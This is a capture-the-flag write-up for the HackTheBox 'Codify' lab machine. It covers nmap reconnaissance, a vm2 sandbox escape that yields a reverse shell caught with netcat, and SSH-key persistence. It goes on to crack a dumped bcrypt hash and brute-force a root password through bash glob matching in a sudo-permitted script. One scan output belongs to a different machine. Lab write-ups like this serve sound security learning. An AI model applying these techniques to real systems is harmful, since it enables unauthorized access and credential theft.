---
title: HackTheBox - Codify write up
date: 2023-11-28 22:19:00 +0100
categories: [HackTheBox]
tags: [HackTheBox, Node.js, vm2, sqlite, SNYK-JS-VM2-5537100]
render_with_liquid: false
---

# Codify

# recon

I ran a simple `nmap` scan to find out port 22, 80 and 3000 are running on the machine

```jsx
$ nmap 10.10.11.239
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-28 13:40 +01
Nmap scan report for 10.10.11.239
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 3.44 seconds
```

upon sending a request to port 80 and examining the response headers, we can see that the `vhost` of this machine is `codify.htb`

```jsx
$ curl -v 10.10.11.239
*   Trying 10.10.11.239:80...
* Connected to 10.10.11.239 (10.10.11.239) port 80
> GET / HTTP/1.1
> Host: 10.10.11.239
> User-Agent: curl/8.3.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< Date: Tue, 28 Nov 2023 12:38:37 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Location: http://codify.htb/
< Content-Length: 304
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://codify.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80</address>
</body></html>
* Connection #0 to host 10.10.11.239 left intact
```

I added that to `/etc/hosts` and ran `nmap` again to get more a more detailed scan about the open ports

```jsx
$ nmap -v -oN ports -v 10.10.11.219
# Nmap 7.94 scan initiated Sat Jul  8 20:01:58 2023 as: nmap -v -oN ports -v 10.10.11.219
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2023-07-08 20:01:58 +01 for 2s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul  8 20:02:00 2023 -- 1 IP address (1 host up) scanned in 2.03 seconds
```

then ran a full scan on them to have an idea of what I’m dealing with

```bash
$ nmap -sC -sV -A codify.htb -p 22,80,3000 -oN detailed_scan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-28 13:44 +01
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Codify
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   122.83 ms 10.10.14.1
2   123.48 ms codify.htb (10.10.11.239)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.43 seconds
```

![index](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/index.png)

it appears that the website is some kinda sandbox to run `node js` application with some limitations such as blacklisting some modules that allows us to run OS commands

![limitations](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/limitations.png)

of course, one should never take these things at face value and manual tests are are must so I scrambled some test that tries to run commands but none of it worked, I could only get some basic info about the machine using the `os` model such as the architecture, the `tmpdir` ..


![editor](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/editor.png)

moving on, browsing to `/about` tells you that the website uses vm2 library that is `widely used and trusted tool for sandboxing JavaScript`, looking it up, I found this (sandbox bypass)[https://security.snyk.io/vuln/SNYK-JS-VM2-5537100] that allows us to run code from any potential blacklisted library using the view allowed ones


![rce](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/rce.png)

```bash
$ nc -lnvp 1000
Connection from 10.10.11.239:59734
bash: cannot set terminal process group (1252): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ ls .ssh
ls .ssh
ls: cannot access '.ssh': No such file or directory
svc@codify:~$ mkdir .ssh
mkdir .ssh
svc@codify:~$ echo '[MY_SSH_PUBLIC_KEY]' > .ssh/authorized_keys
echo '[MY_SSH_PUBLIC_KEY]' > .ssh/authorized_keys
svc@codify:~$ ^CExiting.
(14:23:14) [ archiso@jeff | ~ ]
$ ssh svc@codify.htb
Enter passphrase for key '/home/jeff/.ssh/id_rsa':
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

svc@codify:~$
```

# joshua

looking around I found an sqlite3 database with `joshua`'s password laying in `/var/www/contact`

```bash
svc@codify:/var/www/contact$ ls
index.js  open  package.json  package-lock.json  templates  tickets.db
svc@codify:/var/www/contact$ file tickets.db
tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
svc@codify:/var/www/contact$ sqlite3 tickets.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite>
```

now that I got `joshua`'s hash, I cracked it then used it to login via ssh

```bash
$ echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash
$
$ $ john hash --wordlist=$ROCK
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)
1g 0:00:00:39 DONE (2024-04-17 00:25) 0.02502g/s 34.23p/s 34.23c/s 34.23C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
$
```

```bash
svc@codify:/var/www/contact$ su joshua
Password: 
joshua@codify:/var/www/contact$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
```

# root

once u login as `joshua` you find out that you can execute a bash script as root

```bash
joshua@codify:/opt/scripts$ sudo -l

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
  
joshua@codify:/opt/scripts$ cat /opt/scripts/mysql-backup.sh
```

## analyzing /opt/scripts/mysql-backup.sh

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

the problem with this script lies in the following lines which compare a user-supplied password with the credentials in `/root/.creds`

```bash
DB_PASS=$(/usr/bin/cat /root/.creds)

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

comparing password in bash is all good till you remember that it’s done via expansion and pattern matching (e.g you can get the correct password by just supplying a `*` which is a pattern to match `anything`) but our goal is get the password rather than bypass the if statement, first thing I did was trying to figure out the password length 

while the `*` pattern which match anything, there exists `?` which only matches one character, so we can use to to get the length e.g try first time with `?` then `??`, then `???` .. till you the scripts give out back a `Password confirmed!`, from there you can bruteforce character by character (e.g `a???????...` then `b??????...` then `c?????....` till you get it right then move on to the next character), getting the length was already tedious to do by hand so I made a little python script to get the password for me
